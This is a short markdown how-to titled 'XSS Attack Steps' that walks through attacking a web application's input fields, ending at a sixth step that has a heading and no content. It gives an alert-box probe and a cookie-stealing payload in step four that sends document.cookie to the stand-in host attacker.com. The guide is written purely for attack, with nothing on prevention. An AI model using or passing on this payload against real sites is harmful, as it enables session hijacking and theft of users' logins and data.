# XSS Attack Steps

1. **Identify Input Fields**
    - Locate user input fields (e.g., search boxes, comment forms) in the target application.

2. **Test for Input Validation**
    - Enter harmless scripts like `<script>alert('XSS')</script>` to check if input is sanitized.

3. **Analyze Output**
    - Observe if the script executes or if the input is reflected back unsanitized.

4. **Craft Malicious Payload**
    - Create a payload to steal cookies or session data, e.g., `<script>document.location='http://attacker.com/?c='+document.cookie</script>`.

5. **Deliver Payload**
    - Submit the payload through the vulnerable input field.

6. **Trigger Execution**